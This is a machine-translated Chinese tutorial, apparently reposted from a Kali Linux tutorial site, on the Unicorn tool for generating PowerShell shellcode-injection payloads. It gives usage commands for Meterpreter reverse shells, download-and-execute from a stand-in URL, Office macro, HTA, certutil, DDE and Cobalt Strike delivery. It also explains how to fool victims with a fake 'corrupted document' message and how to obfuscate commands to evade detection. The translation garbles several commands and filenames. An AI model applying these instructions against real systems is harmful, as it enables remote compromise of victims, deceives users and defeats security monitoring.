# 独角兽–降级攻击&将外壳代码直接注入内存

> 原文：<https://kalilinuxtutorials.com/unicorn-attack-inject-shellcode/>

独角兽是利用 PowerShell 降级攻击并将外壳代码直接注入内存的简单工具。基于 Matthew Graeber 的 PowerShell 攻击和 David Kennedy (TrustedSec)和乔什·凯利在 Defcon 18 上展示的 PowerShell 旁路技术。

用法很简单，只需运行 magic unicorn(如果使用 Metasploit 方法，请确保 Metasploit 安装在正确的路径中), Magic Unicorn 将自动生成一个 Powershell 命令，您只需将 PowerShell 代码剪切并粘贴到命令行窗口或通过有效负载交付系统即可。Unicorn 支持您自己的外壳代码、钴击和 Metasploit。

**也读作 [洋葱 nmap 扫描隐藏洋葱服务](https://kalilinuxtutorials.com/onion-nmap-scan-hidden-services/)**

## **POWERSHELL 攻击指令**

现在，所有内容都生成在两个文件中，powershell_attack.txt 和 unicorn.rc。该文本文件包含将 powershell 攻击注入内存所需的所有代码。注意，您需要一个支持某种远程命令注入的地方。这通常可以通过 excel/word 文档或 Metasploit、SQLi 等内部的 psexec_commands 来实现..

对于您可以在何处使用这种攻击，有许多暗示和场景。只需将 powershell_attack.txt 命令粘贴到任何命令提示符窗口或您能够调用 powershell 可执行文件的地方，它就会返回一个 shell。此攻击还支持负载方法的 windows/download_exec，而不仅仅是 Meterpreter 负载。使用下载和执行时，只需将 python unicorn . py windows/download _ exec URL =[https://www.thisisnotarealsite.com/payload.exe](https://www.thisisnotarealsite.com/payload.exe)，PowerShell 代码就会下载有效载荷并执行。

**注意:**为了捕获攻击，您需要启用一个监听器。

## **宏攻击指令**

对于宏攻击，您需要转到文件、属性、功能区，然后选择开发人员。一旦你这样做了，你将有一个开发者标签。创建一个新宏，将其命名为 Auto_Open，并将生成的代码粘贴到其中。这将自动运行。

请注意，会有一条消息提示用户文件已损坏，并自动关闭 excel 文档。这是正常行为！这是欺骗受害者认为 excel 文档已损坏。之后你应该会通过 PowerShell 注入得到一个 shell。

如果您针对 Word 的 Office365/2016+版本部署此功能，您需要修改 Sub Auto_Open()输出的第一行

To: Sub 自动打开()

宏本身的名称也必须是“AutoOpen ”,而不是传统的“Auto_Open”命名方案。

**注意:**在复制和粘贴 excel 时，如果添加了额外的空格，您需要在变量“x”下的每个 PowerShell 代码段后删除这些空格，否则将会出现语法错误！

## **HTA 的攻击指令**

HTA 攻击将自动生成两个文件，第一个是**index.html**，它告诉浏览器使用包含恶意 PowerShell 注入代码的 Launcher.hta。所有文件都被导出到 **hta_access/** 文件夹，将会有三个主文件。第一个是 index.html 的**，第二个是 Launcher.hta，最后一个是 unicorn.rc 文件。您可以运行 **msfconsole -r unicorn.rc** 来启动 Metasploit 的监听器。**

 **用户在使用 HTA 攻击时必须单击“允许并接受”, PowerShell 注入才能正常工作。

## **CERUTIL 攻击指令**

Matthew Graeber 发现了 certutil 攻击媒介，它允许您获取一个二进制文件，将其转换为 base64 格式，并在受害者机器上使用 certutil 将其转换回二进制文件。这几乎可以在任何系统上运行，并允许您通过伪造的证书文件将二进制文件传输到受害机器上。要使用这种攻击，只需在 unicorn 的路径中放置一个可执行文件，并运行 python**unicorn . py<exe _ name>CRT**以获得 base64 输出。完成后，进入包含文件的 **decode_attack/** 文件夹。bat 文件是一个可以在 windows 机器上运行的命令，用于将其转换回二进制文件。

## **自定义 PS1 攻击指令**

这种攻击方法允许您将任何 PowerShell 文件(. ps1)转换为编码的命令或宏。

**注意:**如果选择宏选项，大型 ps1 文件可能会超过 VBA 允许的回车数量。您可以通过传递一个整数作为参数来更改每个 VBA 字符串中的字符数。

示例:

**python unicorn.py 无害. ps1 python unicorn.py myfile.ps1 宏 python unicorn.py muahahaha.ps1 宏 500**

最后一个将使用 500 个字符的字符串，而不是默认的 380 个，从而减少 VBA 中的回车。

## **DDE Office COM 攻击指令**

该攻击媒介将生成 DDEAUTO 公式，并放入 Word 或 Excel 中。COM 对象 DDEInitilize 和 DDEExecute 允许在 Office 中直接创建公式，这使得能够在不需要宏的情况下远程执行代码。该攻击已被记录，完整说明可在以下网址找到:

[https://sense post . com/blog/2017/macro-less-code-exec-in-ms word/](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)

为了使用这种攻击，运行以下示例:

**python unicorn . py DDE python unicorn . py windows/meter preter/reverse _ https 192 . 168 . 5 . 5 443 DDE**

一旦生成， **powershell_attack.txt** 将被生成，其中包含 Office 代码和 **unicorn.rc** 文件，该文件是监听器组件，可由 msfconsole -r unicorn.rc 调用以处理有效负载的监听器。此外，还将导出一个 download.ps1(在后面的部分中解释)。

为了应用有效载荷，例如:

*   **开字**
*   **插入标签- >快速零件- >字段**
*   **选择=(公式)，点击确定。**
*   插入字段后，您应该会看到“！公式"意外结束
*   **右键单击字段，选择【切换字段代码】**
*   **粘贴来自 Unicorn 的代码**
*   **保存 Word 文档。**

打开 office 文档后，您应该会通过 PowerShell injection 收到一个 shell。注意，DDE 对字符大小有限制，我们需要使用调用表达式(IEX)作为下载方法。

DDE 攻击将尝试下载 download.ps1，这是我们的 PowerShell 注入攻击，因为我们受限于大小限制。您需要将 download.ps1 移动到受害机器可以访问的位置。这意味着您需要将 download.ps1 托管在它可以访问的 Apache2 目录中。

你可能会注意到一些命令使用了" **{引用**"，这些是屏蔽特定命令的方式，在这里[有记录](http://staaldraad.github.io/2017/10/23/msword-field-codes/)。

在这种情况下，我们正在更改 **WindowsPowerShell** 、【powershell.exe】和 **IEX** 以避免被检测到。此外，查看 URL，因为它有一些根本不调用 DDE 的好方法。

## **进口钴击信标**

该方法将直接从钴击导入钴击信标外壳代码。在 Cobalt Strike 中，导出 Cobalt Strike“CS”(c#)导出并将其保存到文件中。比如调用文件， **cobalt_strike_file.cs** 。

导出代码如下所示:

*   **长度:836 字节*/ byte[] buf =新字节[836] { 0xfc 等**

接下来，关于用法:

*   **python unicorn . py cobalt _ strike _ file . cs cs**

cs 参数告诉 Unicorn 您想要使用钴击功能。剩下的就是魔法了。接下来，只需将 PowerShell 命令复制到您能够远程执行命令的地方。

**注意:**该文件必须在 cobalt strike 中以 c# (cs)格式导出才能正确解析。

这种攻击有一些警告。请注意，有效负载的字节大小将略大于 14k+。这意味着从命令行参数的角度来看，如果您复制和粘贴，您将遇到 8191 个字符大小的限制(硬编码到 cmd.exe 中)。如果您直接从 cmd.exe 启动，这是一个问题，但是，如果您直接从 PowerShell 或其他正常应用程序启动，这不是问题。

这里有几个例子，wscript.shell 和 PowerShell 使用 USHORT–65535/2 = 32767 大小限制:

*   **typedef struct _ UNICODE _ STRING { USHORT Length；USHORT MaximumLengthPWSTR 缓冲区；} UNICODE _ STRING**

对于这种攻击，如果您直接从 PowerShell 启动，VBScript (WSCRIPT。SHELL)，不存在任何问题。

## **自定义 Shellcode 生成方法**

这个方法将允许你在独角兽攻击中插入你自己的外壳代码。PowerShell 代码将增加 powershell.exe 的堆栈端(通过 VirtualAlloc)并将其注入内存。

请注意，为了使其工作，您指向 Unicorn 的 txt 文件必须按照以下格式进行格式化，否则它将无法工作:

0x00、0x00、0x00 等等。

另外，请注意有大小限制。PowerShell 命令的总长度不能超过 8191。这是 Windows 中命令行参数的最大大小限制。

用法:

*   **python uniocrn . py shellcode _ formatted _ proper . txt shellcode**

接下来，只需将 PowerShell 命令复制到您能够远程执行命令的地方。

**注意:**该文件必须正确格式化为 0x00、0x00、0x00 类型的格式，txt 文件中除了您的外壳代码之外没有其他内容。

这种攻击有一些警告。请注意，如果你的有效载荷很大，它就不适合 cmd.exe。这意味着从命令行参数的角度来看，如果您复制和粘贴，您将遇到 8191 个字符大小的限制(硬编码到 cmd.exe 中)。如果您直接从 cmd.exe 启动，这是一个问题，但是，如果您直接从 PowerShell 或其他正常应用程序启动，这不是问题。

这里有几个例子，wscript.shell 和 PowerShell 使用 USHORT–65535/2 = 32767 大小限制:

*   **typedef struct _ UNICODE _ STRING { USHORT Length；USHORT MaximumLengthPWSTR 缓冲区；} UNICODE _ STRING**

对于这种攻击，如果您直接从 PowerShell 启动，VBSCript (WSCRIPT。SHELL)，不存在任何问题。

[![](img/d861a9096555aeb1980fc054015933d7.png)](https://github.com/TrustedSec/unicorn)**